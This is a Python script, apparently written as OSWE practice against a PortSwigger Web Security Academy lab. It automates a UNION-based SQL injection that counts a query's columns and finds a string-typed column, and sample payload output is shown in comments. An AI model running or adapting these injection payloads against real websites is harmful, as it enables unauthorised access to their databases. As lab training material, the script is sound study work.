import requests
import json
import urllib

# Description:
# An automated SQL 'Union based' exploit script to perform the following:
# (1) identify number of columns
# (2) identify which column are String type
# (3) inject query
#
# This is my OSWE prep to better python scripting skills. 
# The lab used for this practice can be found in Portswigger Academy
# Web Security Academy > SQL injection > UNION attacks > Lab

# URL of target
URL = "https://ac6c1ffb1f9581c0c03208ce000a00e5.web-security-academy.net/filter?category=Corporate+gifts"

found = False	# boolean flag for finding no. of cols
addText = "null," 	# null string to test columns

count = 0  	# counter start
maxCount = 20    # maximum number of cols to try


# Lab (1) identify number of columns

print("Detecting number of columns\n")
while(found == False):

	# The "null" string will keep incrementing until a "Success" condition is identified	
	payload = "' union select {}null--".format(count*addText)
	print("Trying... {} column: {}".format(count+1,payload))

	res = requests.get(URL+payload)
	data = res.text

	# To identify a "Success" condition, the response 
	# would contain the following results "product?productId"
	# We shall search an occurence of it using the condition below 
	if (data.count('/product?productId') > 1):
		print("\n[+] Found! There are {} columns.".format(count+1))
		print("[+] Payload used: {}\n".format(payload))		
		found = True
		break

	count=count+1

count=count+1   # offset count as it started from 0

# (2) identify which column are String type
print("Detecting column data type")

# build the query that will be used for injection
# We use 'null' string for each column
inject = ["null"] * count   

# string used to identify "string" type
string = "'abc'"

for i in range(count):
	# replace nth position of 'null' string with string type
	inject[i] = string
	if (i > 0):
		# reset the previous position except for the first occurence
		inject[i-1] = "null"

	# prepare the SQL injection statement before adding to payload
	tmp = ",".join(inject) #eg. null,'a',null
	payload = "' union select {}--".format(tmp)
	print("Trying... position {}: {}".format(i+1,payload))

	# Send request with SQL injection
	res = requests.get(URL+payload)

	# Identify "success" condition. Observe that succcess is 200, whereas failure is 500.
	if res.status_code == 200:		
		print("\n[+] Found! Column no {} is a string type\n".format(i+1))
		break
	else:
		i=i+1

# [-] Trying 1: ' union select null--
# [-] Trying 2: ' union select null,null--
# [-] Trying 3: ' union select null,null,null--
# [+] Found! Payload used: ' union select null,null,null--


